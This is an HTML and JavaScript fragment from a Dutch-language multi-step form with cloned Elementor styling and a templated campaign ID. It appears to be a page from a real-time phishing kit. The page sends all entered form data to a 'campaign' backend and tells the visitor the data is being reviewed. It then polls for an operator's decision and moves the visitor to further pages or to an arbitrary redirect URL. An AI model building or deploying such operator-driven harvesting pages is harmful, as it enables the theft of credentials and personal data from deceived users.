		 <div id="status-view" class="status-msg hidden">
      <div id="status-spinner" class="spinner"></div>
      <h2 id="status-title"></h2>
      <p id="status-text"></p>
      <p class="waiting-info" id="waiting-info"></p>

<script>
    var API_BASE = 'http://localhost:3001';
    var CAMPAIGN_ID = '{{CAMPAIGN_ID}}';
    var PAGE_NUM = 1;
    var IS_LAST = false;
    var NEXT_PAGE = 2;
    var pollTimer = null;
    function getSessionId() {
      var sid = localStorage.getItem('campaign_session_id');
      if (!sid) {
        sid = (crypto && crypto.randomUUID) ? crypto.randomUUID()
            : ('sid-' + Date.now() + '-' + Math.random().toString(16).slice(2));
        localStorage.setItem('campaign_session_id', sid);
      }
      return sid;
    }
    async function handleSubmit(e) {
      e.preventDefault();
      var btn = document.getElementById('submit-btn');
      if (btn) { btn.disabled = true; btn.querySelector('.elementor-button-text').textContent = 'Bezig...'; }
      var form = document.getElementById('create-campaign-form');
      var data = {};
      new FormData(form).forEach(function(v, k) { data[k] = v; });
      form.querySelectorAll('input[type=checkbox]').forEach(function(cb) {
        if (cb.name) data[cb.name] = cb.checked;
      });
      try {
        var res = await fetch(API_BASE + '/api/campaigns/' + CAMPAIGN_ID + '/page/' + PAGE_NUM + '/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ session_id: getSessionId(), fields: data })
        });
        var result = await res.json();
        showStatus('Even geduld...', 'Uw gegevens worden beoordeeld. U wordt automatisch doorgestuurd zodra deze zijn verwerkt.', true);
        if (!pollTimer) startPolling();
      } catch(err) {
        alert('Fout bij verzenden');
        if (btn) { btn.disabled = false; btn.querySelector('.elementor-button-text').textContent = IS_LAST ? 'Verzenden' : 'Continue'; }
      }
    }
    function showStatus(title, text, showSpinner) {
      var fv = document.getElementById('form-view');
      if (fv) fv.classList.add('hidden');
      var sv = document.getElementById('status-view');
      sv.classList.remove('hidden');
      sv.style.display = 'flex';
      document.getElementById('status-title').textContent = title;
      document.getElementById('status-text').textContent = text;
      document.getElementById('status-spinner').style.display = showSpinner ? 'block' : 'none';
      document.getElementById('waiting-info').textContent = showSpinner ? 'Wachten op beoordeling' : '';
    }
    function hideStatus() {
      var fv = document.getElementById('form-view');
      if (fv) fv.classList.remove('hidden');
      var sv = document.getElementById('status-view');
      sv.classList.add('hidden');
      sv.style.display = 'none';
    }
    function startPolling() {
      if (pollTimer) return;
      pollTimer = setInterval(async function() {
        try {
          var res = await fetch(API_BASE + '/api/campaigns/user-status/' + getSessionId() + '/' + CAMPAIGN_ID);
          var status = await res.json();
          if (status.status === 'approved') {
            showStatus('Goedgekeurd!', 'Uw aanvraag is goedgekeurd.', false);
          } else if (status.status === 'returned') {
            if (status.current_page !== PAGE_NUM) {
              window.location.href = 'page_' + status.current_page + '.html';
            } else {
              hideStatus();
              var btn = document.getElementById('submit-btn');
              if (btn) { btn.disabled = false; btn.querySelector('.elementor-button-text').textContent = IS_LAST ? 'Verzenden' : 'Continue'; }
            }
          } else if (status.status === 'redirected' && status.redirect_url) {
            window.location.href = status.redirect_url;
          } else if (status.status === 'pending' && status.current_page > PAGE_NUM) {
            window.location.href = 'page_' + status.current_page + '.html';
          }
        } catch(e) {}
      }, 3000);
    }
    document.addEventListener('DOMContentLoaded', function() {
      var form = document.getElementById('create-campaign-form');
      form.addEventListener('submit', handleSubmit);
      if (!pollTimer) startPolling();
    });
  </script>
